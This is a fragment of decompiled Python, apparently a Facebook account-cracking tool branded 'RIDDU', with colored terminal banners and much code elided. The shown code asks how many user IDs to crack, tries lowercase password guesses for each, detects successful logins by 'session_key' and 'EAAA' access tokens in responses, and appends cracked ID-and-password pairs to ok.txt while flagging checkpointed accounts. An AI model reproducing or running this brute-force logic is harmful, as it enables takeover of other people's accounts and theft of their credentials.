# Decompile by Mardis (Tools By Hridoy Hossain)
W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
...
|_   __ \   |_   _||_   _ `.|_   _ `.|_   _||_   _| 
  ...
  |  __ /     | |    | |  | | | |  | | | '    ' |   
 _| |  \ \_  _| |_  _| |_.' /_| |_.' /  \ \__/ /    
|____| |___||_____||______.'|______.'    `.__.'     
...
\033[92;1m╰───────────────────────────────────────────────────────────╯
\033[92;1m╰───────────────────────────────────────────────────────────╯
 \033[1;32m[\033[0;41;37m==========={ AUTHER 🔥\033[0;37;41m LEGEND }===========\033[1;37;40m\033[1;32m] \033[1;37;40m     
   """
...
class Main:
	...
	def fbtua(self):
		...
		limit = int(input(" \033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 5000,0: "))
		try:
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[RIDDU] : %s/%s -> \033[0;97m [OK:%s ] \033[0;97m[CP:%s ]"%(W,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m   [RIDDU-OK] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;91m   [RIDDU-CP] %s | %s\033[0;97m         "%(uid, pw))
